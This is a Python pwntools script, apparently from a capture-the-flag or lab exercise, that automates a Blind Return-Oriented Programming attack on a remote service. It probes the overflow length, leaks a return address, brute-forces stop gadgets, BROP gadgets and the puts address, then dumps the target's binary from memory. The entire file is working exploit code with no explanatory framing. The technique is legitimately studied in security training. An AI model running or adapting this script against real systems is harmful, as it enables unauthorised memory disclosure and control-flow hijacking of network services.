#!/usr/bin/env python3

from pwn import *
from utils import connect, disconnect, debugInfo
from Crypto.Util.number import bytes_to_long

timeout = 0.1


def getPadding(debug=False):
    log.info('finding overflow size')
    i = 0 # counter

    while True:
        # connect to server and wait for prompt
        r = connect()
        r.recv(timeout=timeout)

        # send the growing buffer
        i += 1
        pld = b'X' * i
        r.send(pld)

        # check output
        try:
            output = r.recv(timeout=timeout)
            disconnect(r)
            if output:
                debugInfo(f'{i} -> {output}', debug)
        except:
            log.warn(f'overflow when padding size = {i}')
            return i-1 # -1 because we want the padding size


def leakAddr(pad):
    c = b'X'
    pld = c * pad

    # connect to serv and send pld
    r = connect()
    r.recv(timeout=timeout)
    r.send(pld)

    # return addr leak
    leak = r.recv(timeout=timeout)
    addr = bytes_to_long(leak[leak.rfind(c) + 1:-5][::-1])
    return addr


def getStopGadgets(pad, base_addr, ref, debug=False):
    log.info(f'searching stop gadgets, base addr = {hex(base_addr)}')
    L = [] # found addresses
    start = 0x0
    end = start + 0x1500

    for i in range(start, end):
        r = connect()

        try:
            # build payload
            addr = base_addr + i
            pld = b'X' * pad    # fill buffer
            pld += p64(addr)    # rip
            debugInfo(f'searching stop gadgets, trying {hex(addr)}', debug)

            # send pld and check if ref is in output
            r.recv(timeout=timeout)
            r.send(pld)
            res = r.recv(timeout=timeout)
            if ref in res:
                L.append(addr) # this address is a stop gadget

        except: # we crashed, close socket and continue
            pass
        disconnect(r)

    return L # return found stop gadgets


def getBropGadgets(pad, base_addr, ref, stop_gadgets, debug):
    stop_gadget = stop_gadgets[0]
    log.info(f'searching BROP gadgets, base addr = {hex(base_addr)}')
    start = 0
    end = start + 0x2000
    L = []

    # iterate over the whole ELF
    for i in range(start, end):
        r = connect()

        try:
            # build payload
            addr = base_addr + i
            pld = b'X' * pad           # fill buffer
            pld += p64(addr)           # overwrite `rip` with gadget
            pld += p64(0) * 6          # 6 addresses popped into registers
            pld += p64(stop_gadget)    # regain exec flow control with the `ret`
            debugInfo(f'searching brop gadgets, trying {hex(addr)}', debug)

            # send payload and receive response
            r.recv(timeout=timeout)
            r.send(pld)
            res = r.recv(timeout=timeout)
            if ref in res:
                # /!\ be careful with false positives /!\
                if addr not in stop_gadgets:
                    L.append(addr)

        except: # we crashed, close socket and continue
            pass
        disconnect(r)

    return L # return found BROP gadgets


def getPutsAddr(pad, stop_gadget, pop_rdi, base_addr, debug):
    # iterate over the whole ELF
    start = 0x0
    end = start + 0x2000
    log.info(f'searching puts addr, base addr = {hex(base_addr)}')

    for i in range(start, end):
        r = connect()

        try:
            # build payload
            addr = base_addr + i
            pld = b'X' * pad          # fill buffer
            pld += p64(pop_rdi)       # load `pop rdi; ret` opcodes in `rdi`
            pld += p64(pop_rdi)       # puts arg = '\x5f\xc3'
            pld += p64(addr)          # puts addr
            pld += p64(stop_gadget)   # stop gadget

            # send payload and receive response
            debugInfo(f'searching puts addr, trying {hex(addr)}', debug)
            r.recv(timeout=timeout)
            r.send(pld)
            res = r.recv(timeout=timeout)
            if b'\x5f\xc3' in res:
                return addr

        except: # we crashed, close socket and continue
            pass
        disconnect(r)

    # fail, the BROP gadget is not correct
    return None


def leakData(ref, pad, pop_rdi, puts_addr, leak_addr, stop_gadget, debug):
    r = connect()
    debugInfo(f'leaking data at addr {hex(leak_addr)}', debug)

    # build payload
    pld = b'X' * pad                       # fill buffer
    pld += p64(pop_rdi) + p64(leak_addr)   # load addr we want to leak in `rdi`
    pld += p64(puts_addr)                  # puts addr with the arg we control
    pld += p64(stop_gadget)                # stop gadget

    # send payload
    r.recv(timeout=0.1)
    r.send(pld)

    # if no more output
    try:
        rec = r.recv(timeout=timeout)
    except:
        return None

    data = b'\x00'
    try:
        # parse output to get the leak
        data = rec[rec.index(b'@')+1:rec.index(b'\n' + ref)]
    except: # null byte
        pass

    # close socket and return the leak
    disconnect(r)
    return data if data else b'\x00'


def dumpBinary(ref, pad, base_addr, pop_rdi, puts_addr, stop_gadget, debug):
    end = 0x4000
    filename = './dumped_binary'
    binary = b''
    leak_addr = base_addr
    log.info(f'leaking binary from {hex(base_addr)} to {hex(base_addr+end)}')

    while leak_addr < base_addr + end:
        data = leakData(ref, pad, pop_rdi, puts_addr, leak_addr, stop_gadget,
                        debug)
        if not data: # reached end of binary
            break
        leak_addr += len(data)
        binary += data

    # save the leaked bytes
    with open(filename, 'wb') as f:
        f.write(binary)
    log.success(f'dumped binary in {filename}')
